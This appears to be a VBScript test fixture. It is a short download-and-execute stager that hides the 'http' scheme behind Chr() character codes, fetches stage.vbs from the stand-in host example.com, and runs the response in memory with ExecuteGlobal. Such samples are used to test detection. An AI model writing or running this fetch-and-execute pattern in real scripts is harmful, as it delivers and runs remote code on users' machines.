' Chr-wrapper download-and-execute fixture: builds its URL from character
' codes, fetches it over HTTP, and executes the response in memory.
Dim req, target, stage
target = "" & code(104) & code(116) & code(116) & code(112) & "://example.com/stage.vbs"
Set req = CreateObject("MSXML2.XMLHTTP")
req.open "GET", target, False
req.send
If req.Status = 200 Then
    stage = req.responseText
    ExecuteGlobal stage
End If
Set req = Nothing
Function code(n)
    code = Chr(n)
End Function
